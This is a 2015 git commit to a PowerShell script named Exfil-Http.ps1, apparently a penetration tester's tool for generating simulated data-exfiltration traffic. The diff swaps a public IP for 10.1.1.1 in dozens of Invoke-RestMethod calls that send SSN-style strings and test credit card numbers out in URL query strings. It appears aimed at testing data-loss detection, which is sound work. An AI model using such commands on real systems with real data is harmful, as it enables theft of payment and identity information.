885ad6c30364be99a01c4d5be49d2a62b422176b
Scott Sutherland <scott.sutherland@nullbind.com>
2015-07-17 09:11:37 -0500

    Update Exfil-Http.ps1

--- Brainstorming/Exfil/Exfil-Http.ps1
+++ Brainstorming/Exfil/Exfil-Http.ps1
@@ -1,54 +1,28 @@
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=123-45-6789" | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=123456789" | out-null 
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=test123456789test" | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011 2089 4444 4440" | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011 2089 4444 4440"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011 2089 4444 4440"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011-2089-4444-4440"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011-2089-4444-4440"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011-2089-4444-4440"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011208944444440"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011208944444440"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011208944444440"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011208947270453"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011208947270453"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011208947270453"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011 9980 8140 9707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011 9980 8140 9707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011 9980 8140 9707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011-9980-8140-9707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011-9980-8140-9707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011-9980-8140-9707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011998081409707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011998081409707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=6011998081409707"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=378282246310005"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=4012888888881881"  | out-null
-Invoke-RestMethod "http://207.87.188.230/?netspi=1&data=4222222222222" | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=123-45-6789" | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=123456789" | out-null 
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=test123456789test" | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011 2089 4444 4440" | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011 2089 4444 4440"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011 2089 4444 4440"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011-2089-4444-4440"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011-2089-4444-4440"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011-2089-4444-4440"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011208944444440"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011208944444440"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011208944444440"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011208947270453"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011208947270453"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011208947270453"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011 9980 8140 9707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011 9980 8140 9707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011 9980 8140 9707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011-9980-8140-9707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011-9980-8140-9707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011-9980-8140-9707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011998081409707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011998081409707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=6011998081409707"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=378282246310005"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=4012888888881881"  | out-null
-Invoke-RestMethod "https://207.87.188.230/?netspi=1&data=4222222222222" | out-null
+# upload data
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=123-45-6789" | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=123456789" | out-null 
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=test123456789test" | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 2089 4444 4440" | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 2089 4444 4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 2089 4444 4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-2089-4444-4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-2089-4444-4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-2089-4444-4440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208944444440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208944444440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208944444440"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208947270453"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208947270453"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011208947270453"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 9980 8140 9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 9980 8140 9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011 9980 8140 9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-9980-8140-9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-9980-8140-9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011-9980-8140-9707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011998081409707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011998081409707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=6011998081409707"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=378282246310005"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=4012888888881881"  | out-null
+Invoke-RestMethod "http://10.1.1.1/?netspi=1&data=4222222222222" | out-null
